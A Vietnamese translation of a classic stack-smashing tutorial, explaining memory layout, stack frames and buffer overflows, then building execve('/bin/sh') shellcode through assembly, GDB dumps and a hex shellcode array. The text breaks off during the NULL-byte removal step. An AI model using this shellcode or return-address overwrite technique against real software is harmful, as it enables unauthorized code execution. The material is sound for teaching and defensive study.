I. Cấu trúc bộ nhớ 

Để hiểu những gì bộ đệm của stack đầu tiên chúng ta phải hiểu quá trinh này được tổ chức như thế nào trong bộ nhớ. Quá trình được chia làm 3 phần. Text, Data và Stack. Chúng ta sẽ tập trung về phần Stack, nhưng trước tiên cần có một cái nhìn tổng quan về các khu vực nhỏ khác theo thứ tự.
  
  Các khu vực văn bản được cố định bởi chương trình và bao gồm cả code, chỉ đọc dữ liệu. Khu vực này tương ứng với phần văn bản của các tệp tin được thực thi. Khu vực này được đánh dấu chỉ đọc và bất kỳ sự xâm phạm để ghi nó sẽ dẫn đến kết quả trong một segmentation violation.

  Khu vực chứa data được khởi tạo và chưa được khởi tạo. Các biến tĩnh được lưu trữ ở khu vực này. Vùng data tương ứng với phần data-bss của file thực thi. Kích thước của nó có thể thay đổi khi hệ thống gọi brk(2). Nếu việc mở rộng data-bss hoặc người sử dụng hết stack bộ nhớ có sẵn, quá trình này sẽ bị chặn và được dời lại để chạy với không gian bộ nhớ lớn hơn. Bộ nhớ mới sẽ được thêm vào giữa data và stack segments.

                             /------------------\  lower
                             |                  |  memory
                             |       Text       |  addresses
                             |                  |
                             |------------------|
                             |   (Initialized)  |
                             |        Data      |
                             |  (Uninitialized) |
                             |------------------|
                             |                  |
                             |       Stack      |  higher
                             |                  |  memory
                             \------------------/  addresses

                         Fig. 1 Process Memory Regions

						Stack là gì ?
						~~~~~~~~~~~~~

Một stack là một kiểu dữ liệu trừu tượng thường được sử dụng trong khoa học máy tính. Một stack của đối tượng có đặc tính mà các đối tượng cuối cùng đặt lên trên stack sẽ là đối tượng đầu tiên được lấy ra, loại bỏ. Đặc tính được gọi chung là vào sau ra trước hoặc LIFO.

Một số hoạt động được xác định trên stack và 2 cái quan trọng nhất là push và pop. PUSH là thêm một phần tử vào đỉnh stack.  POP thì ngược lại, giảm kích thước của stack bằng một cách loại bỏ một phần tử cuối cùng tại đỉnh stack.

Tại sao chúng ta sử dụng stack ?

Các stack cũng được sử dụng tự động phân phát các biến cục bộ sử dụng trong funcitons, để truyền tham số funciton và trả về một giá trị của funciton.
 
Vùng Stack

Một stack là một khối liền kề của bộ nhớ chứa dữ liệu. Một thanh ghi được gọi khi con trỏ ngăn xếp (SP) trỏ đến đỉnh stack. Phần dưới cùng của stack sẽ là một địa chỉ được cố định. Kích thước của nó tự động điểu chỉnh bởi kernel trong lúc chạy. CPU thực hiện các hướng dẫn để PUSH và POP lên stack. Các stack gồm các stack frames luận lí để PUSH khi gọi một function và POP khi trả về, bao gồm giá trị của con trỏ tại thời điểm khi function được gọi.

Tùy thuộc vào các việc thực hiện mà stack sẽ xuống ( về phía các địa chỉ bộ nhớ thấp hơn) hoặc tăng.  Trong ví dụ dưới đây, chúng tôi sẽ sử dụng stack để giảm xuống địa chỉ bộ nhớ thấp hơn. Đây là cách ngăn xếp phát triển trên nhiều máy tính bao gồm Intel, bộ vi xử lý Motorola, SPARC và MIPS. Con trỏ stack (SP) cũng phụ thuộc vào việc thực hiện. Nó có thể đến vị trí cuối cùng của stack hoặc đến địa chỉ có sẵn không sử dụng tiếp theo. Để thảo luận, chúng tôi sẽ chiếm lấy con trỏ đến địa chỉ cuối của stack.

Ngoài các con trỏ stack mà điểm đến của nó là đỉnh stack ( địa chỉ thấp nhất), nó cũng thích hợp cho việc frame pointer  (FP)  chỉ vào một vị trí cố định trong frame. Một số text cũng được xem như một local base pointer (LB).  Về nguyên tắc, các biến cục bộ cũng có thể tham chiếu bằng cách địa chỉ offset từ SP. Tuy nhiên, PUSH lên đỉnh stack và POP từ stack thì offset cũng thay đổi. Mặc dù trong một số trường hợp trình biên dịch có thể theo dõi số lượng từ stack, từ đó điểu chính các offset, trong một vài trường hợp có thể không và trong mọi trường hợp administration là cần thiết. Hơn nữa trên một số máy, chẳng hạn như bộ xử lí Intel, truy cập một biến cách xa từ SP đòi hỏi phải có nhiều hướng dẫn. 

Do đó, nhiều trình biên dịch sử dụng một thanh ghi thứ hai, FP, để tham chiếu đến các biến cục bộ và các tham số bởi vì cách biệt ra từ FP không làm thay đổi PUSH và POP.
Trên các CPU Intel, BP (EBP) được sử dụng cho mục đích này. Trên các CPU Motorola, sẽ làm bất kì thanh ghi nào ngoại trừ A7 ( con trỏ stack) . Bởi vì cách mà chúng tôi phát triển stack, các tham số offset lớn hơn số không và biến cục bộ không nhận offset từ FP.

Điều đầu tiên của một thủ tục phải làm khi được gọi là lưu ở FP trước (do đó, nó có thể được phục hồi ở phần thoát của thủ tục). Sau đó nó sao chép SP vào FP để tạo FP mới và sự tăng lên của SP từ không gian lưu trữ cho các biến cục bộ. Những code này được là các thủ tục prolog. Khi các thủ tục thoát, stack sẽ được làm trống một lần nữa.

Chúng ta hãy xem những gì diễn ra ở stack ở một ví dụ đơn giản:

 example1.c :
---------------------------------------------------------------------------------------------------------
void function(int a, int b, int c) {
   char buffer1[5];
   char buffer2[10];
}

void main() {
  function(1,2,3);
}
----------------------------------------------------------------
Để hiểu được chương trình sẽ làm gì khi gọi function, chúng ta sẽ biên dịch nó với gcc sử dụng lựa chọn –S để tạo ra code assembly:

$ gcc -S -o example1.s example1.c

Bằng cách nhìn và ngôn ngữ assembly chúng ta sẽ thấy chương trình khi gọi một hàm sẽ được dịch ra như dưới đây: 
        pushl $3
        pushl $2
        pushl $1
        call function

Đoạn ở trên này sẽ đẩy 3 tham số của một function từ phải qua trái vào stack và gọi function(). Các hướng dẫn call sẽ đẩy con trỏ IP và stack. Chúng tôi sẽ gọi IP là nơi lưu trữ địa chỉ được trả về (RET). Đây sẽ là điều đầu tiên được thực hiện thủ tục prolog trong một function: 

       pushl %ebp
       movl %esp,%ebp
       subl $20,%esp

Điều này sẽ đẩy EBP (frame pointer) và đỉnh stack. Nó sao chép EBP vào SP, tạo ra một FP mới. Chúng tôi sẽ gọi FP là nơi lưu trữ con trỏ SFP (con trỏ chứa địa chỉ bắt đầu của stack). Sau đó nó sẽ phân chia không gian cho các biến cục bộ bằng cách trừ đi kích thước của ESP. Chúng ta phải nhớ, bộ nhớ chỉ có thể được giải quyết trong nhiều phần của kích thước word. Một word trong trường hợp của chúng ta sẽ chiếm 4 bytes hoặc 32bit, 1 byte = 8 bit. Vì vậy, 5 bytes của bộ đệm thực sự sẽ mất 8 bytes ( 2 words) của bộ nhớ và 10 bytes của bộ đệm sẽ mất 12 bytes ( 3 words) của bộ nhớ. Đó là lí do tại sao SP lại trừ đi 20. Với những điều này, stack sẽ như thế này khi function được gọi ( mỗi không gian lưu trữ đại diện cho 1 byte):

bottom of                                                            top of
memory                                                               memory
               buffer2     buffer1     sfp    ret       a      b     c
<------   [            ][                ][      ][       ][       ][      ][     ]
	   
top of                                                            	bottom of
stack                                                                        stack

			
						Tràn bộ đệm
						~~~~~~~~~~~

Một lỗi tràn bộ đệm là kết quả của việc dữ liệu đưa vào bộ đệm nhiều hơn việc nó có thể xử lý. Làm thế nào để thường xuyên tìm thấy các lỗi của trường trình có thể thực thi các mã này. Hãy xem xét ví dụ dưới đây : 

example2.c
------------------------------------------------------------------------------
void function(char *str) {
   char buffer[16];

   strcpy(buffer,str);
}

void main() {
  char large_string[256];
  int i;

  for( i = 0; i < 255; i++)
    large_string[i] = 'A';

  function(large_string);
}

Chương trình trên có một lỗi tràn bộ đệm tiêu biểu. Hàm kiểm tra sao chép một chuỗi mà không kiểm tra giới hạn được sử dụng strcpy() thay vì strncpy(). Nếu bạn chạy chương trình này, bạn sẽ nhận được một segmentation violation. Xem những gì diễn ra ở stack khi chúng ta gọi function.

bottom of                                                            top of
memory                                                               memory
                      buffer            sfp   ret   *str
<------          [                ][          ][     ][     ]

top of                                                            bottom of
stack                                                                 stack


Chuyện gì đang xảy ra ở đây ? Tại sao chúng ta lại có một segmentation violation ? Rất đơn giản, strcpy() sẽ sao chép nội dung của *str (larger_string[]) trong buffer[] cho đến khi một kí tự NULL được tìm thấy. Như chúng ta thấy buffer[] nhỏ hơn rất nhiều so với *str, buffer[] chỉ có 16 byte và chúng tôi cố gắng ghi đè nó với 256 byte. Điều này có nghĩa rằng tất cả 250 byte còn lại của stack đều sẽ bị ghi đè lên, bao gồm cả SFP, RET và *str. Chúng tôi sẽ điền vào các chuỗi bằng kí tự A, nó sẽ mang giá trị hex là 0x41. Điều này có nghĩa rằng địa chỉ trả về sẽ là 0x41414141. Đây là bên ngoài của không gian địa chỉ tiến trình. Nó cũng là lí do tại sao khi function trả về và cố gắng đọc tiếp từ những gì của đại chỉ sẽ có một segmentation violation. 

Vì vậy một lỗi buffer overflow cho phép chúng ta thay đổi địa chỉ trả về của một function. Bằng cách này chúng ta có thể thay đổi các luồng thực thi của chương trình. Quay lại ví dụ đầu tiên của chúng ta và xem lại stack có cái gì: 
bottom of                                                            top of
memory                                                               memory
           buffer2       buffer1   sfp   ret   a     b     c
<------   [            ][        ][    ][    ][    ][    ][    ]

top of                                                            bottom of
stack                                                                 stack


Cố gắng sửa đổi ở ví dụ đầu tiên của chúng ta để nó ghi đè lên địa chỉ trả về và làm thế nào để thực thi các mã tùy ý. Chỉ có trước buffer1[] trên stack là SFP và trước nó, địa chỉ trả về. Đó là vượt qua được 4 byte cuối của buffer1[]. Nhưng nhớ rằng buffer1[] thực sự là 2 word vì thế nó cũng như 8 byte. Vì vậy địa chỉ trả về là 12 byte bắt đầu từ buffer1[]. Chúng tôi sẽ sửa đổi giá trị trả về bằng lệnh gán ‘x = 1;’ sau khi gọi function. Làm vậy để chúng tôi thêm 8 byte vào địa chỉ trả về. 

example3.c:
------------------------------------------------------------------------------
void function(int a, int b, int c) {
   char buffer1[5];
   char buffer2[10];
   int *ret;

   ret = buffer1 + 12;
   (*ret) += 8;
}

void main() {
  int x;

  x = 0;
  function(1,2,3);
  x = 1;
  printf("%d\n",x);
}
------------------------------------------------------------------------------

Những gì đã làm ở trên là cộng thêm 12 vào địa chỉ của buffer1[]. Địa chỉ mới này là nơi địa chỉ trả về được lưu trữ. Chúng tôi muốn bỏ qua việc gọi printf(). Làm thế nào để chúng ta cộng thêm 8 vào địa chỉ trả về. Chúng tôi sủ dụng thử một giá trị ban đầu (ví dụ 1), biên dịch chương trình sau đó bắt đầu với GDB. 

[aleph1]$ gdb example3
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(no debugging symbols found)...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000490 <main>:       pushl  %ebp
0x8000491 <main+1>:     movl   %esp,%ebp
0x8000493 <main+3>:     subl   $0x4,%esp
0x8000496 <main+6>:     movl   $0x0,0xfffffffc(%ebp)
0x800049d <main+13>:    pushl  $0x3
0x800049f <main+15>:    pushl  $0x2
0x80004a1 <main+17>:    pushl  $0x1
0x80004a3 <main+19>:    call   0x8000470 <function>
0x80004a8 <main+24>:    addl   $0xc,%esp
0x80004ab <main+27>:    movl   $0x1,0xfffffffc(%ebp)
0x80004b2 <main+34>:    movl   0xfffffffc(%ebp),%eax
0x80004b5 <main+37>:    pushl  %eax
0x80004b6 <main+38>:    pushl  $0x80004f8
0x80004bb <main+43>:    call   0x8000378 <printf>
0x80004c0 <main+48>:    addl   $0x8,%esp
0x80004c3 <main+51>:    movl   %ebp,%esp
0x80004c5 <main+53>:    popl   %ebp
0x80004c6 <main+54>:    ret
0x80004c7 <main+55>:    nop

Chúng ta có thể có thấy rằng khi gọi function thì RET sẽ là 0x8004a8 và chúng ta muốn bỏ qua việc tại 0x80004ab. Ở hướng dẫn tiếp theo chúng ta muốn thực thi mã tại 0x80004b2. Một chút về toán học cho chúng ta biết khoảng cách là 8 byte.
 
				Shell Code

Vì vậy chúng ta có có thể biết thay đổi địa chỉ trả về và tràn của thực thi. Chương trình chúng ta muốn thực hiện gồm những gì ? Trong hầu hết các trường hợp chúng tôi sẽ đơn giản muốn chương trình từ một shellcode. Từ shellcode chúng tôi có thể thực thi các lệnh khác mà chúng tôi muốn. Nhưng nếu không có các code như vậy trong chương trình thì chúng tôi sẽ cố gắng khai thác nó. Làm thế nào để chúng ta có thể đặt các lệnh tùy ý vào chương trình ở các không gian địa chỉ.? Câu trả lời là cố gắng đặt các mã này để thực hiện trong bộ đệm của chúng ta khi nó tràn và ghi đè lên địa chỉ trả về, do đó nó cũng là điểm trở về của bộ đệm. Giả sử địa chỉ bắt đầu của stack là 0xFF và S là viết tắt của các mã muốn thực thi ở stack và nó sẽ như thế này: 

bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

<------   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
           ^                            |
           |____________________________|
top of                                                            bottom of
stack                                                                 stack

Code của một shell trong ngôn ngữ C:

shellcode.c
-----------------------------------------------------------------------------
#include <stdio.h>

void main() {
   char *name[2];

   name[0] = "/bin/sh";
   name[1] = NULL;
   execve(name[0], name, NULL);
}
------------------------------------------------------------------------------

Để tìm hiểu nó có những gì trong assembly, biên dịch nó ra và bắt đầu với GDB. Hãy nhớ sử dụng các cờ -static. Nếu không mã gọi hệ thống execve() sẽ không được gọi. Thay vào đó nó sẽ tham chiếu đến một thư viện của C, mà thông thường nó sẽ được liên kết với nhau trong việc tải thời gian. 



------------------------------------------------------------------------------
[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
[aleph1]$ gdb shellcode
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 <main>:       pushl  %ebp
0x8000131 <main+1>:     movl   %esp,%ebp
0x8000133 <main+3>:     subl   $0x8,%esp
0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)
0x8000144 <main+20>:    pushl  $0x0
0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax
0x8000149 <main+25>:    pushl  %eax
0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
0x800014d <main+29>:    pushl  %eax
0x800014e <main+30>:    call   0x80002bc <__execve>
0x8000153 <main+35>:    addl   $0xc,%esp
0x8000156 <main+38>:    movl   %ebp,%esp
0x8000158 <main+40>:    popl   %ebp
0x8000159 <main+41>:    ret
End of assembler dump.
(gdb) disassemble __execve
Dump of assembler code for function __execve:
0x80002bc <__execve>:   pushl  %ebp
0x80002bd <__execve+1>: movl   %esp,%ebp
0x80002bf <__execve+3>: pushl  %ebx
0x80002c0 <__execve+4>: movl   $0xb,%eax
0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx
0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx
0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx
0x80002ce <__execve+18>:        int    $0x80
0x80002d0 <__execve+20>:        movl   %eax,%edx
0x80002d2 <__execve+22>:        testl  %edx,%edx
0x80002d4 <__execve+24>:        jnl    0x80002e6 <__execve+42>
0x80002d6 <__execve+26>:        negl   %edx
0x80002d8 <__execve+28>:        pushl  %edx
0x80002d9 <__execve+29>:        call   0x8001a34 <__normal_errno_location>
0x80002de <__execve+34>:        popl   %edx
0x80002df <__execve+35>:        movl   %edx,(%eax)
0x80002e1 <__execve+37>:        movl   $0xffffffff,%eax
0x80002e6 <__execve+42>:        popl   %ebx
0x80002e7 <__execve+43>:        movl   %ebp,%esp
0x80002e9 <__execve+45>:        popl   %ebp
0x80002ea <__execve+46>:        ret
0x80002eb <__execve+47>:        nop
End of assembler dump.
------------------------------------------------------------------------------

Cố gắng hiểu những đang xảy ra bằng cách nghiên cứu ở hàm main(). 

------------------------------------------------------------------------------
0x8000130 <main>:       pushl  %ebp
0x8000131 <main+1>:     movl   %esp,%ebp
0x8000133 <main+3>:     subl   $0x8,%esp
	  
	Đây là khởi đầu cho một function. Đầu tiên nó sẽ lưu frame pointer cũ, làm cho 
    frame pointer mới tại stack hiện tại và rời khỏi không gian cho các biến cục bộ. Trong trường hợp này :

    char *name[2];

	hoặc 2 con trỏ đến một kí tự. Con trỏ dài 1 word. Do đó nó chiếm không gian cho 2 word (8 byte).

0x8000136 <main+6>:     movl   $0x80027b8,0xfffffff8(%ebp)
	
    Sao chép 0x80027b8 (địa chỉ của chuỗi “/bin/sh”) vào con trỏ đầu tiên của name[]. Điều này tương đương: 

    name[0] = "/bin/sh";

0x800013d <main+13>:    movl   $0x0,0xfffffffc(%ebp)

	Sao chép giá trị 0x0 (NULL) vào con trỏ thứ hai của name[].
	
	name[1] = NULL;
	
	Các việc gọi hàm execve() bắt đầu từ đây. 

0x8000144 <main+20>:    pushl  $0x0

	Đẩy các đối số của execve() theo thứ tự ngược vào stack. Bắt đầu với NULL.

0x8000146 <main+22>:    leal   0xfffffff8(%ebp),%eax

	Đưa địa chỉ của name[] vào thanh ghi EAX.
	
0x8000149 <main+25>:    pushl  %eax
	
	Đẩy địa chỉ của name[] vào stack

0x800014a <main+26>:    movl   0xfffffff8(%ebp),%eax
	
	Đưa địa chỉ của chuỗi "/bin/sh" vào thanh ghi EAX
	
0x800014d <main+29>:    pushl  %eax

	Đẩy địa chỉ của chuỗi "bin/sh" vào stack
	
0x800014e <main+30>:    call   0x80002bc <__execve>

	Gọi hàm execve(), lệnh gọi này sẽ đẩy IP vào đỉnh stack.

-------------------------------------------------------------------------------------------------

Ngay tại execve(), chú ý chúng ta sử dụng một hệ thống Intel based Linux. Các chi tiết của syscall sẽ thay đổi từ hệ điều hành sang hệ điều hành và từ CPU sang CPU. Một số sẽ vượt qua các tham số trên stack, những thanh ghi khác. Một số sử dụng phần mềm để làm gián đoạn để chuyển sang chế độ kernel, cũng có thể từ các cuộc gọi từ xa. Linux sẽ đi qua các tham số của nó cho các cuộc gọi của hệ thống trên thanh ghi và sử dụng phần mềm để làm gián đoạn để chuyển sang chế độ kernel.

-------------------------------------------------------------------------------------------------

0x80002bc <__execve>:   pushl  %ebp
0x80002bd <__execve+1>: movl   %esp,%ebp
0x80002bf <__execve+3>: pushl  %ebx
	
	Mở đầu một funciton.

0x80002c0 <__execve+4>: movl   $0xb,%eax

	Sao chép 0xb (11 trong dec) vào stack. Đây là chỉ số của bảng syscall. 11 là execve().

0x80002c5 <__execve+9>: movl   0x8(%ebp),%ebx

	Sao chép địa chỉ của chuỗi "/bin/sh" vào EBX.
	
0x80002c8 <__execve+12>:        movl   0xc(%ebp),%ecx

	Sao chép địa chỉ của name[] vào ECX
	
0x80002cb <__execve+15>:        movl   0x10(%ebp),%edx

	Sao chép địa chỉ của con trỏ NULL vào EDX
	
0x80002ce <__execve+18>:        int    $0x80

	Thay đổi chế độ kernel.
	
-----------------------------------------------------------------------------------------------

Vì vậy, khi chúng ta có thể thấy được không có hệ thống gọi nhiều execve().	Tất cả việc chúng ta cần làm.

	a) Có được null sau cùng chuỗi "/bin/sh" ở bất kì trên bộ nhớ.
	b) Có được địa chủ của chuỗi "/bin/sh" trên bộ nhớ theo sau đó là một word null.
	c) Sao chép 0xb vào thanh ghi EAX.
	d) Sao chép địa chỉ của địa chỉ chuỗi "/bin/sh" vào thanh ghi EBX.
	e) Sao chép địa chỉ của chuỗi "/bin/sh" vào thanh ghi ECX.
	f) Sao chép địa chỉ của null word và thanh ghi EDX.
	g) Thực thi lệnh int $0x80.
	
Nhưng nếu không gọi được execve() với một số lý do, chương trình sẽ tiếp tục thực hiện từ stack với dữ liệu ngẫu nhiên. Chúng tôi muốn chương trình thoát luôn nếu syscall không execve(). Để làm được điều này thì chúng ta phải thêm một exit cho syscall nếu syscall không execve(). Exit cho syscall sẽ như thế này: 

exit.c
------------------------------------------------------------------------------
#include <stdlib.h>

void main() {
        exit(0);
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ gcc -o exit -static exit.c
[aleph1]$ gdb exit
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(no debugging symbols found)...
(gdb) disassemble _exit
Dump of assembler code for function _exit:
0x800034c <_exit>:      pushl  %ebp
0x800034d <_exit+1>:    movl   %esp,%ebp
0x800034f <_exit+3>:    pushl  %ebx
0x8000350 <_exit+4>:    movl   $0x1,%eax
0x8000355 <_exit+9>:    movl   0x8(%ebp),%ebx
0x8000358 <_exit+12>:   int    $0x80
0x800035a <_exit+14>:   movl   0xfffffffc(%ebp),%ebx
0x800035d <_exit+17>:   movl   %ebp,%esp
0x800035f <_exit+19>:   popl   %ebp
0x8000360 <_exit+20>:   ret
0x8000361 <_exit+21>:   nop
0x8000362 <_exit+22>:   nop
0x8000363 <_exit+23>:   nop
End of assembler dump.
------------------------------------------------------------------------------

Các exit của syscall sẽ đặt 0x1 vào EAX, đặt code exit vào EBX và thực thi "int 0x80". Đây là nó. Hầu hết các chương trình sẽ trả exit về 0 nếu không thấy lỗi. Chúng tôi sẽ đặt 0 vào EBX. Danh sách của chúng tôi bây giờ : 
	
	a) Có được null sau cùng chuỗi "/bin/sh" ở bất kì trên bộ nhớ.
	b) Có được địa chủ của chuỗi "/bin/sh" trên bộ nhớ theo sau đó là một word null.
	c) Sao chép 0xb vào thanh ghi EAX.
	d) Sao chép địa chỉ của địa chỉ chuỗi "/bin/sh" vào thanh ghi EBX.
	e) Sao chép địa chỉ của chuỗi "/bin/sh" vào thanh ghi ECX.
	f) Sao chép địa chỉ của null word và thanh ghi EDX.
	g) Thực thi lệnh int $0x80.
	h) Sao chép 0x1 vào thanh ghi EAX.
	i) Sao chép 0x0 vào thanh ghi EBX.
	j) Thực thi lệnh int $0x80.
	
Cố gắng đưa những điều này vào ngôn ngữ assembly. Đặt các chuỗi này sau code và chúng tôi sẽ đặt địa chỉ của của chuỗi, null word sau array.

------------------------------------------------------------------------------
        movl   string_addr,string_addr_addr
		movb   $0x0,null_byte_addr
        movl   $0x0,null_addr
        movl   $0xb,%eax
        movl   string_addr,%ebx
        leal   string_addr,%ecx
        leal   null_string,%edx
        int    $0x80
        movl   $0x1, %eax
        movl   $0x0, %ebx
		int    $0x80
        /bin/sh string goes here.
------------------------------------------------------------------------------	

Vấn đề xảy ra là chúng ta không biết đâu trong không gian bộ nhớ của chương trình để cố gắng khai thác mã (và các chuỗi sau nó) sẽ được đặt. Một cách là sử dụng một JMP và một CALL. JMP và CALL có thể được sử dụng để giải quyết các logic, có nghĩa là chúng ta có thể nhảy tới một địa chỉ offset từ IP hiện tại mà không cần biết địa chỉ chính xác nơi bộ nhớ mà chúng ta muốn nhảy tới. Nếu chúng ta đặt lệnh CALL ngay trước chuỗi "/bin/sh" và câu lệnh JMP trước nó, địa chỉ của chuỗi sẽ được đẩy vào stack như địa chỉ trả về khi CALL được thực thi. Tất cả chúng ta cần sau đó là sao chép địa chỉ trả về vào một thanh ghi. Một lệnh CALL chỉ đơn giản là có thể bắt đầu gọi mã của chúng tôi ở trên. Giả sử bây giờ J là viết tắt của JMP, C là CALL và s cho chuỗi, các việc thực thi sẽ là:


bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
           buffer                sfp   ret   a     b     c

<------   [JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]
           ^|^             ^|            |
           |||_____________||____________| (1)
       (2)  ||_____________||
             |______________| (3)
top of                                                            bottom of
stack                                                                 stack

Với các thay đổi này, sử dụng địa chỉ index và viết ra mỗi mã của chúng tôi chiếm bao nhiêu byte

------------------------------------------------------------------------------
        jmp    offset-to-call           # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,array-offset(%esi)  # 3 bytes
        movb   $0x0,nullbyteoffset(%esi)# 4 bytes
        movl   $0x0,null-offset(%esi)   # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   array-offset,(%esi),%ecx # 3 bytes
        leal   null-offset(%esi),%edx   # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax		# 5 bytes
        movl   $0x0, %ebx		# 5 bytes
	int    $0x80			# 2 bytes
        call   offset-to-popl           # 5 bytes
        /bin/sh string goes here.
------------------------------------------------------------------------------

Tính toán địa chỉ offet từ JMP đến CALL, từ CALL đến popl, từ địa chỉ chuỗi đến array và từ địa chỉ chuỗi đến NULL word:

------------------------------------------------------------------------------
        jmp    0x26                     # 2 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)		# 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax		# 5 bytes
        movl   $0x0, %ebx		# 5 bytes
	int    $0x80		        # 2 bytes
        call   -0x2b                    # 5 bytes
        .string \"/bin/sh\"		# 8 bytes
------------------------------------------------------------------------------

Có vẻ tốt. Để chắc chắn rằng nó hoạt động một cách chính xác, chúng ta cần biên dịch và chạy nó. Nhưng có một vấn đề, mã của chúng tôi có thể thay đổi chính nó, nhưng hầu hết các hệ điều hành dánh dầu các mã này chỉ để đọc. Để hạn chế được việc này chúng ta phải đặt mã, chúng tôi muốn thực thi trong stack hoặc data segment và di chuyển điều khiển cho nó. Để làm như vậy, chúng tôi sẽ đặt mã của chúng tôi trong một mảng trong data segment. Đầu tiên chúng ta cần diễn tả mã hex của hệ nhị phân. Đầu tiên hãy biên dịch nó sau đó sử dụng GDB để làm được điều đó. 

shellcodeasm.c
------------------------------------------------------------------------------
void main() {
__asm__("
        jmp    0x2a                     # 3 bytes
        popl   %esi                     # 1 byte
        movl   %esi,0x8(%esi)           # 3 bytes
        movb   $0x0,0x7(%esi)           # 4 bytes
        movl   $0x0,0xc(%esi)           # 7 bytes
        movl   $0xb,%eax                # 5 bytes
        movl   %esi,%ebx                # 2 bytes
        leal   0x8(%esi),%ecx           # 3 bytes
        leal   0xc(%esi),%edx           # 3 bytes
        int    $0x80                    # 2 bytes
        movl   $0x1, %eax               # 5 bytes
        movl   $0x0, %ebx               # 5 bytes
        int    $0x80                    # 2 bytes
        call   -0x2f                    # 5 bytes
        .string \"/bin/sh\"             # 8 bytes
");
}
------------------------------------------------------------------------------

------------------------------------------------------------------------------
[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
[aleph1]$ gdb shellcodeasm
GDB is free software and you are welcome to distribute copies of it
 under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 <main>:       pushl  %ebp
0x8000131 <main+1>:     movl   %esp,%ebp
0x8000133 <main+3>:     jmp    0x800015f <main+47>
0x8000135 <main+5>:     popl   %esi
0x8000136 <main+6>:     movl   %esi,0x8(%esi)
0x8000139 <main+9>:     movb   $0x0,0x7(%esi)
0x800013d <main+13>:    movl   $0x0,0xc(%esi)
0x8000144 <main+20>:    movl   $0xb,%eax
0x8000149 <main+25>:    movl   %esi,%ebx
0x800014b <main+27>:    leal   0x8(%esi),%ecx
0x800014e <main+30>:    leal   0xc(%esi),%edx
0x8000151 <main+33>:    int    $0x80
0x8000153 <main+35>:    movl   $0x1,%eax
0x8000158 <main+40>:    movl   $0x0,%ebx
0x800015d <main+45>:    int    $0x80
0x800015f <main+47>:    call   0x8000135 <main+5>
0x8000164 <main+52>:    das
0x8000165 <main+53>:    boundl 0x6e(%ecx),%ebp
0x8000168 <main+56>:    das
0x8000169 <main+57>:    jae    0x80001d3 <__new_exitfn+55>
0x800016b <main+59>:    addb   %cl,0x55c35dec(%ecx)
End of assembler dump.
(gdb) x/bx main+3
0x8000133 <main+3>:     0xeb
(gdb)
0x8000134 <main+4>:     0x2a
(gdb)
.
.
.
------------------------------------------------------------------------------

testsc.c
------------------------------------------------------------------------------
char shellcode[] =
	"\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
	"\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
	"\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
	"\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

void main() {
   int *ret;

   ret = (int *)&ret + 2;
   (*ret) = (int)shellcode;

}
------------------------------------------------------------------------------
------------------------------------------------------------------------------
[aleph1]$ gcc -o testsc testsc.c
[aleph1]$ ./testsc
$ exit
[aleph1]$
------------------------------------------------------------------------------

Nó hoạt động nhưng có một trở ngại. Trong hầu hết các trường hợp chúng tôi sẽ cố gắng để tràn bộ đệm với ký tự. Như vậy bất kỳ byte NULL trong shellcode của chúng tôi sẽ coi là kết thúc chuỗi và bản sao sẽ chấm dứt. Có phải không có byte NULL trong shellcode để làm việc khai thác. Hãy có gắng loại bỏ các byte (và đồng thời làm cho nó nhỏ hơn). 

          Hướng dẫn				Thay thế bằng:
           --------------------------------------------------------
           movb   $0x0,0x7(%esi)                xorl   %eax,%eax
